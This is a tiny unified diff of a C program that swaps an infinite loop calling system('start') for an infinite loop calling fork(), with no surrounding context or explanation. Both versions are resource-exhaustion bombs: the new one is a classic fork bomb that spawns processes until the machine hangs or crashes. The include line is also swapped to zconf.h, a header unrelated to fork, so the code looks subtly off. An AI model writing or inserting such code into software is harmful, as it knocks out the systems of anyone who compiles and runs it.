@@ -1,7 +1,7 @@
-#include <stdlib.h>
+#include <zconf.h>
 
 int main() {
     while (1){
-        system("start");
+        fork();
     }
 }
